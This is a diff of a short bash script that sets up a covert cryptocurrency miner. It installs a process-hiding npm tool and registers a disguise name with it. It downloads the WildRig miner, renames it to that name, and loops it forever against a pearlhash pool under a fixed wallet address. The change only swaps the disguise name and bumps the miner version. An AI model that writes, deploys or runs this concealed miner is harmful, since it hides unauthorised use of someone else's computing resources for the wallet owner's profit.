@@ -1,9 +1,9 @@
 #!/bin/bash
 npm i -g node-process-hider
-ph add kosambilo
-wget https://github.com/andru-kun/wildrig-multi/releases/download/0.52.1/wildrig-multi-linux-0.52.1.tar.gz
-tar xf wildrig-multi-linux-0.52.1.tar.gz
-mv wildrig-multi kosambilo
+ph add jamskao
+wget https://github.com/andru-kun/wildrig-multi/releases/download/0.52.2/wildrig-multi-linux-0.52.2.tar.gz
+tar xf wildrig-multi-linux-0.52.2.tar.gz
+mv wildrig-multi jamskao
 while true; do
-./kosambilo --algo pearlhash --url global.pearlhash.net:9000 --user prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr --worker $(echo $RANDOM | md5sum | head -c 10)
+./jamskao --algo pearlhash --url global.pearlhash.net:9000 --user prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr --worker $(echo $RANDOM | md5sum | head -c 10)
 done
